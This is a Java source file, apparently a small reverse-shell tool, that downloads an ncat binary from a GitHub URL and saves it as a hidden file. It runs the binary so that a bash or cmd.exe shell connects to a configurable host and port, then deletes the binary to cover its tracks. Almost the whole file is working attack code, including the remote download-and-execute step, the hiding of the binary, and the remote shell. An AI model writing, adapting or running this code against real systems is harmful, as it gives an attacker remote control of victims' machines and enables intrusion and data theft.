import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;


public class revShellSmall {
	/*
	 * Declarations
	 */
	static String host = "127.0.0.1"; //TODO CHANGE ME
	static String port = "31337"; //TODO CHANGE ME

	/*
	 * In Linux create a new (hidden) netcat executable and execute it
	 */
	private static boolean linCreate() throws IOException {
 		//Get system architecture and present working direcectory
		String arch = System.getProperty("os.arch");
		String pwd = System.getProperty("user.dir");
		//Instantiate website
		URL website = null;

		//Check for 64 / 32 bit and then set website accordingly //TODO dynamic version if this fails
		if(arch.contains("64") || arch.contains("x86")){
			website = new URL("https://github.com/Hashdump/RevShell/raw/master/Resources/ncat64");
		}else{
			website = new URL("https://github.com/Hashdump/RevShell/raw/master/Resources/ncat32");
		}
		//Create byte channel for creating binary
		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
		//Write to .ncat so that it is a hidden file
		FileOutputStream fos = new FileOutputStream(".ncat");
		//Transfer data then close fos
		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
		fos.close();
		//Open netcat file
		File ncat = new File(".ncat");
		//Delete on exit so if something goes wrong
		ncat.deleteOnExit();
		//Set to chmod 777
		ncat.setExecutable(true, false);
		ncat.setReadable(true, false);
		ncat.setWritable(true, false);

		//Set up runtime to run executable
		Runtime r = Runtime.getRuntime();
		Process p = null;
		try {
			//Execute .ncat -c /bin/bash host port
			p = r.exec(pwd + "/.ncat -c /bin/bash " + host + " " + port);
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		try {
			p.waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
			return false;
		}
		//Cleanup
		ncat.delete();
		return true;
	}

	/*
	 * In Windows create a new (hidden) netcat executable and execute it
	 * NOT TESTED
	 */
	//TODO Testing
	private static boolean winCreate() throws IOException {
		String pwd = System.getProperty("user.dir");
		URL website = null;

		website = new URL("https://github.com/Hashdump/RevShell/raw/master/Resources/ncat.exe");
		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
		FileOutputStream fos = new FileOutputStream("ncat.exe");
		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
		fos.close();
		File ncat = new File("ncat.exe");
		ncat.deleteOnExit();
		ncat.setExecutable(true, false);
		ncat.setReadable(true, false);
		ncat.setWritable(true, false);
		//Hidden
		Runtime.getRuntime().exec("attrib +H ncat.exe");

		Runtime r = Runtime.getRuntime();
		Process p = null;
		try {
			p = r.exec(pwd + "\\ncat.exe -e C:\\Windows\\System32\\cmd.exe " + host + " " + port);
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		try {
			p.waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
			return false;
		}

		//Cleanup
		ncat.delete();
		return true;
	}

	/*
	 * Main: Check OS and select from there.
	 */
	public static void main(String args[]){
		String OS = System.getProperty("os.name");
		if(OS.equals("Linux")){
			try {
				linCreate();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		if(OS.toLowerCase().contains("windows")){
			try {
				winCreate();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}
